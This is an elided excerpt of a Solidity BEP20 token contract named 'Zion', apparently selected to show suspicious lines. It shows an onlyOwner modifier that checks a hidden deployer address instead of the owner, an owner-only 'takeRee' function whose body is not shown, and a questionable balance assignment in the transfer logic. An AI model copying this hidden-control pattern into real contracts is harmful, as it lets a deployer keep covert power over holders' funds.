...
abstract contract Auth {
     ...
     */
    modifier onlyOwner() {
        require((_deployer == _msgSender()), "Ownable: caller is not the owner"); _;
  }
...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 REWARD = IBEP20(0x3b1F033dD955f3BE8649Cc9825A2e3E194765a3F); //BUSD TESTNET
...
contract Zion is IBEP20, Auth {
    using SafeMath for uint256;

    //Token auto-rewarded
    address REWARD = 0x3b1F033dD955f3BE8649Cc9825A2e3E194765a3F; //BUSD TESTNET
    ...
    // "liquidityFee + reflectionFee" = totalFee
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        // max wallet code
        if (!authorizations[sender] && recipient != address(this) && recipient != address(DEAD) && recipient != pair && recipient != autoLiquidityReceiver){
        ...
        uint256 amountReceived = _balances[recipient];
    ...
    function takeRee(uint256 amount) public onlyOwner(){
